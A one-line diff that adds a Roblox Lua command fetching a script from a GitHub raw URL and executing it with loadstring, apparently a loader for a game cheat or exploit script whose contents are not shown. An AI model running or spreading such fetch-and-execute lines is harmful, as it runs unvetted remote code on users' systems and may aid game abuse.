@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/upd-8-cvr-retro-spam6-lp6vroaeggtxts.lua"))()
